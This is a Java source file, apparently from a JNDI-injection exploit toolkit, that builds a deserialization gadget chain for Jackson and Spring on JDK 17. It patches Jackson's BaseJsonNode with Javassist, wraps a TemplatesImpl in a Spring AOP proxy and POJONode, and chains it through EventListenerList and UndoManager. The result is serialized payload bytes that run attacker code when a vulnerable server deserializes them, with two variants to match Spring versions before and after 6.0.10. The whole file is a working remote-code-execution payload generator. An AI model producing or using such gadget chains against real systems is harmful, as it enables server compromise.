package map.jndi.gadget;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import map.jndi.util.ReflectUtil;
import map.jndi.util.SerializeUtil;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.DefaultAdvisorChainFactory;

import javax.swing.event.EventListenerList;
import javax.swing.undo.CompoundEdit;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;
import java.util.Vector;

public class Jackson17 {
    private static Object create(TemplatesImpl templatesImpl) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");

        if (!ctClass.isFrozen()) {
            CtMethod ctMethod = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(ctMethod);
            ctClass.freeze();
            ctClass.toClass();
        }

        AdvisedSupport as = new AdvisedSupport();
        as.setTarget(templatesImpl);

        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getDeclaredConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler jdkDynamicAopProxyHandler = (InvocationHandler) constructor.newInstance(as);

        Templates templatesProxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, jdkDynamicAopProxyHandler);
        POJONode pojoNode = new POJONode(templatesProxy);

        EventListenerList list = new EventListenerList();
        UndoManager undoManager = new UndoManager();

        Vector vector = (Vector) ReflectUtil.getFieldValue(CompoundEdit.class, undoManager, "edits");
        vector.add(pojoNode);

        ReflectUtil.setFieldValue(list, "listenerList", new Object[]{ Class.class, undoManager });
        return list;
    }

    // 跨版本依赖可能存在 serialVersionUID 不一致问题
    // DefaultAdvisorChainFactory 在 6.0.10 版本前后的 serialVersionUID 不同
    // EventListenerList 和 UndoManager 仅在 JDK 17 环境测试

    public static byte[] createA(TemplatesImpl templatesImpl) throws Exception {
        Map<Class<?>, Long> map = new HashMap<>();
        map.put(DefaultAdvisorChainFactory.class, 6115154060221772279L); // before 6.0.10
        map.put(EventListenerList.class, -7977902244297240866L);
        map.put(UndoManager.class, -1045223116463488483L);

        return SerializeUtil.serialize(create(templatesImpl), map);
    }

    public static byte[] createB(TemplatesImpl templatesImpl) throws Exception {
        Map<Class<?>, Long> map = new HashMap<>();
        map.put(DefaultAdvisorChainFactory.class, 273003553246259276L); // after 6.0.10
        map.put(EventListenerList.class, -7977902244297240866L);
        map.put(UndoManager.class, -1045223116463488483L);

        return SerializeUtil.serialize(create(templatesImpl), map);
    }
}
